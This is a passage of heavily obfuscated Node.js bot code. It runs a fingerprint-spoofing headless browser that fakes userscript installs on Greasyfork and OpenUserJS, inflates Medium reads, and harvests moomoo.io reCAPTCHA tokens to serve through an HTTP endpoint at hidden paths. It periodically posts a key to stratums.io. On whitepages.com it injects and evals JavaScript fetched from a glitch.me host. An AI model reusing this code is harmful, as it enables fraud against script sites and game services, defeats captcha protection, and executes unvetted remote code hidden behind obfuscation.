      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + 'quill-org',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    X(0x1, ')VFu') + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + X(0xd, 'AY@j') + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + W(0xa) + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + 'tips-1c4cb' + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + X(0x6, '4F4&') + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + '-18dfa6d6e' + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    X(0xc, '4F4&') + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x208b + -0x85c + -0x1 * 0x182f
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x91e * -0x4 + -0x1 * 0x248e + 0x16)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x177d + -0x6 * -0x34a + 0xf * -0x2db), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, 0xbeb + -0xcdf + -0xac * -0x2), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = -0x5f9 + -0x179d + -0x1d96 * -0x1;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = -0x23b * 0x11 + 0x23 * -0xcf + 0x4238; w < getRandomInt(0x53 * 0x57 + -0x1ab + -0x1a89 * 0x1, 0x1 * 0x2109 + 0x4 * 0x637 + -0x39e0); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0xb674 + -0x18461 + 0x32535);
        }
      }();
    }, 0x8c6 + -0x1df7 + 0x1595), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = -0x57 * 0x52 + 0x561 * -0x1 + -0x1 * -0x213f;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0xa22 + -0x446 * 0x3 + 0x2b0, 0x465 * 0x3 + 0xa90 * 0x2 + -0x221d)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, -0x80f * -0x5 + -0x8e0 * -0xa + -0xbdb);
    }, -0x2597 + 0x161 * 0xd + 0x140e), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x265 * 0x9 + -0x2a8 * -0x1 + 0x12e5;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x10bb + -0x431 + -0xd2), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', 0x2319 + -0x1ecd + -0x44c), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0xc16d7 + -0x1 * -0xdb863 + 0x1c1b * -0x6e);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x2678 + 0x267e + 0x5e * 0x1);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](-0xb75 + -0x8f9 * 0x1 + 0x1536);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || 0x1 * 0x1bf2 + -0x1558 + -0x3 * -0x852);
}
doFlags['doOUJS'] && ((async () => {
  async function f() {
    const Y = c,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = 0x19 * 0x3 + 0x1435 + -0x147f) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * -0x184a + 0x8 * 0x425 + -0x3971));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](0x15c0 + -0x899 * -0x2 + -0x26f2, D['indexOf']('\x20'));
        return B ? E['slice'](0x250a + 0x1f9c + -0x44a6, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](0x12ed + 0x3a22 + 0x47 * -0x89),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x[Y(0xf)])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](-0x1 * -0x1862 + 0x49d2 + -0x3b24),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': 'text/x-use' + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.54'
    ];
  f();
